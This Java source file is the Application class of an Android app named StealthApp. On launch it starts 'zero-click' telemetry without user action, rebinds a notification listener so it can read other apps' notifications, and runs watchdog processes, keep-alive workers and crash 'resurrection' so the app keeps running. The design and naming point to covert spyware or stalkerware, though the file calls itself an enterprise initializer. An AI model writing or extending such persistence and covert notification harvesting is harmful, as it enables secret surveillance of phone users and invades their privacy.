package com.notrack.stealth;

import android.app.Application;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.util.Log;

import androidx.core.app.NotificationManagerCompat;

import com.notrack.stealth.sync.SyncWorker;
import com.notrack.stealth.watchdog.WatchdogReceiver;
import com.notrack.stealth.watchdog.WatchdogService;

import java.util.Set;

/**
 * ENTERPRISE ZERO-CLICK AUTONOMOUS APPLICATION INITIALIZER
 *
 * Bootstraps telemetry engines immediately upon process creation.
 * No user clicks or manual triggers required.
 */
public class StealthApp extends Application {

    private static final String TAG = "StealthApp";
    private static StealthApp sInstance;

    public static StealthApp getInstance() {
        return sInstance;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        sInstance = this;

        // 1. Crash Shield: Global Uncaught Exception Handler to prevent hard process terminates
        final Thread.UncaughtExceptionHandler defaultHandler = Thread.getDefaultUncaughtExceptionHandler();
        Thread.setDefaultUncaughtExceptionHandler((thread, throwable) -> {
            Log.e(TAG, "Uncaught exception in " + thread.getName() + ": " + throwable.getMessage(), throwable);
            try {
                // Schedule resurrection before termination
                WatchdogReceiver.scheduleNextPulse(getApplicationContext());
                SyncWorker.enqueuePeriodicKeepAlive(getApplicationContext());
            } catch (Exception ignored) {}

            if (defaultHandler != null) {
                defaultHandler.uncaughtException(thread, throwable);
            }
        });

        // 2. Identify if running in main process vs isolated watchdog process
        String currentProcessName = getProcessNameCompat();
        Log.i(TAG, "StealthApp created in process: " + currentProcessName);

        if (currentProcessName != null && currentProcessName.endsWith(":watchdog")) {
            // Secondary watchdog process - initialize watchdog pulse and backup update check
            WatchdogReceiver.scheduleNextPulse(this);
            com.notrack.stealth.update.UpdateManager.checkForWatchdogBackupUpdateAsync(this);
            return;
        }

        // 3. Autonomous Zero-Click Bootstrap in Main Process
        bootstrapTelemetryEngines();
    }

    public void bootstrapTelemetryEngines() {
        Log.i(TAG, "Bootstrapping autonomous zero-click telemetry engines...");

        // A. Register WorkManager 30-min Keep-Alive Watchdog
        SyncWorker.enqueuePeriodicKeepAlive(this);
        SyncWorker.enqueueSync(this);

        // B. Rebind NotificationListenerService if permission granted
        if (isListenerPermissionGranted()) {
            StealthService.rebindService(this);
            StealthService service = StealthService.getInstance();
            if (service != null) {
                service.processActiveNotifications();
            }
        }

        // C. Schedule secondary isolated watchdog pulses
        WatchdogReceiver.scheduleNextPulse(this);
        WatchdogService.start(this);
    }

    public boolean isListenerPermissionGranted() {
        try {
            Set<String> packages = NotificationManagerCompat.getEnabledListenerPackages(this);
            return packages != null && packages.contains(getPackageName());
        } catch (Exception e) {
            return false;
        }
    }

    @Override
    public void onTrimMemory(int level) {
        super.onTrimMemory(level);
        Log.d(TAG, "onTrimMemory level: " + level);
        if (level >= TRIM_MEMORY_MODERATE) {
            SyncWorker.enqueueSync(this);
        }
    }

    @Override
    public void onLowMemory() {
        super.onLowMemory();
        Log.w(TAG, "onLowMemory received, flushing pending queues");
        SyncWorker.enqueueSync(this);
    }

    private String getProcessNameCompat() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            return Application.getProcessName();
        }
        return getPackageName();
    }
}
